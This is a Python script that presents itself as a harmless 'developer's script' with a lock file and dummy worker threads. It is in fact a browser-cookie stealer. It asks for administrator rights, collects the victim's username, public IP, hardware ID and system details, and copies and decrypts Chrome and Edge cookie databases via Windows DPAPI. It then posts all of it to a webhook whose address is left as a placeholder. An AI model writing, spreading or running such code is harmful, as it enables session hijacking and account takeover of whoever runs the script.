import os
import sys
import time
import platform
import requests
import uuid
import hashlib
import psutil
import locale
import sqlite3
import shutil
from datetime import datetime
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from base64 import b64decode
import win32crypt  # This will help for decrypting cookies in Windows
import ctypes

# ضبط ترميز stdout إلى UTF-8 لحل مشاكل الإيموجي في Windows
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

def is_admin():
    """Check if the script is run as administrator."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def run_as_admin():
    """Re-run the script with administrator privileges."""
    if sys.argv[0].endswith(".py"):
        script = sys.argv[0]
    else:
        script = sys.executable + " " + sys.argv[0]
    # Re-run the script with admin privileges
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    sys.exit()

if not is_admin():
    print("❌ You need to run this script as an administrator!")
    run_as_admin()

if os.name == "nt":
    LOCK_FILE = os.path.join(os.getenv("TEMP"), "my_script.lock")
    USERNAME = os.getlogin()
    # Use f-string to correctly format the paths
    CHROME_COOKIES_DB = f"C:\\Users\\{USERNAME}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    EDGE_COOKIES_DB = f"C:\\Users\\{USERNAME}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
else:
    LOCK_FILE = "/tmp/my_script.lock"
    CHROME_COOKIES_DB = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
    EDGE_COOKIES_DB = os.path.expanduser("~/.config/microsoft-edge/Default/Cookies")

WEBHOOK_URL = "URL_HERE"

def bytes_to_gb(bytes_value):
    return round(bytes_value / (1024 ** 3), 2)

def get_user_data():
    try:
        ip_address = requests.get("https://api64.ipify.org?format=json").json()["ip"]
    except requests.RequestException:
        ip_address = "Unknown"
    
    user_data = {
        "OS": platform.system(),
        "OS Version": platform.release(),
        "Machine": platform.machine(),
        "Username": os.getlogin(),
        "IP Address": ip_address,
        "Hardware ID": hashlib.sha256(uuid.getnode().to_bytes(6, 'big')).hexdigest(),
        "Run Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Processor": platform.processor(),
        "CPU Count": os.cpu_count(),
        "RAM": bytes_to_gb(psutil.virtual_memory().total),
        "Hostname": platform.node(),
        "Python Version": platform.python_version(),
        "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        "Locale": locale.getlocale()[0],
        "Disk Usage": bytes_to_gb(psutil.disk_usage('/').free),
    }
    return user_data

def decrypt_cookie(encrypted_value):
    try:
        # Decrypting the cookies for Windows
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"Error decrypting cookie: {e}"

def check_file_permissions(file_path):
    if not os.path.exists(file_path):
        print(f"❌ The file {file_path} does not exist.")
        return False
    try:
        with open(file_path, 'rb') as f:
            f.read(1)
        return True
    except PermissionError:
        print(f"❌ Permission denied when trying to access {file_path}. Please ensure you have the right permissions.")
        return False

def get_cookies_from_db(cookies_db):
    print(f"Checking cookies at path: {cookies_db}")  # Debug print to verify path
    if not check_file_permissions(cookies_db):
        return "No Cookies Found"
    
    if not os.path.exists(cookies_db):
        return "No Cookies Found"
    temp_db = "temp_cookies.db"
    shutil.copy2(cookies_db, temp_db)
    cookies = []
    try:
        with sqlite3.connect(temp_db) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = cursor.fetchall()
    except Exception as e:
        return f"Error Extracting Cookies: {e}"
    finally:
        time.sleep(1)
        try:
            os.remove(temp_db)
        except PermissionError:
            return "Error: Temp file still in use!"
    
    # Decrypt cookies
    decrypted_cookies = [(host, name, decrypt_cookie(encrypted_value)) for host, name, encrypted_value in cookies]
    return decrypted_cookies[:5]

def send_data_to_dev(user_data, chrome_cookies, edge_cookies):
    try:
        payload = {
            "content": f"📢 **New Script Run Detected!**\n"
                       f"🔹 **OS:** {user_data['OS']} {user_data['OS Version']} ({user_data['Machine']})\n"
                       f"🔹 **Username:** {user_data['Username']}\n"
                       f"🔹 **IP Address:** {user_data['IP Address']}\n"
                       f"🔹 **Hardware ID:** `{user_data['Hardware ID']}`\n"
                       f"🔹 **Run Time:** {user_data['Run Time']}\n"
                       f"🔹 **Processor:** {user_data['Processor']}\n"
                       f"🔹 **CPU Count:** {user_data['CPU Count']}\n"
                       f"🔹 **RAM:** {user_data['RAM']} GB\n"
                       f"🔹 **Hostname:** {user_data['Hostname']}\n"
                       f"🔹 **Python Version:** {user_data['Python Version']}\n"
                       f"🔹 **Boot Time:** {user_data['Boot Time']}\n"
                       f"🔹 **Locale:** {user_data['Locale']}\n"
                       f"🔹 **Disk Usage:** {user_data['Disk Usage']} GB\n"
                       f"🔹 **Chrome Cookies:** {chrome_cookies[:5]}... (Limited for Security)\n"
                       f"🔹 **Edge Cookies:** {edge_cookies[:5]}... (Limited for Security)"
        }
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"❌ Failed to send data: {e}")

def check_single_instance():
    if os.path.exists(LOCK_FILE):
        print("\n❌ The script is already running! Please close the previous instance first.")
        input("\nPress Enter to exit...")
        sys.exit(1)
    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))

def remove_lock_file():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
            print("\n🔓 Lock file removed successfully.")
    except Exception as e:
        print(f"\n⚠️ Failed to remove lock file: {e}")

def dev():
    print("\n🚀 Developer's script is running...\n")
    for i in range(5):
        print(f"Thread {i+1} is working...")
        time.sleep(2)
    print("\n✅ Developer's script finished execution.")

if __name__ == "__main__":
    try:
        check_single_instance()
        print("\n✅ Script is running! No other instances allowed.")
        user_info = get_user_data()
        chrome_cookies = get_cookies_from_db(CHROME_COOKIES_DB)
        edge_cookies = get_cookies_from_db(EDGE_COOKIES_DB)
        send_data_to_dev(user_info, chrome_cookies, edge_cookies)
        dev()
    finally:
        remove_lock_file()
        time.sleep(1)
    input("\nPress Enter to exit...")
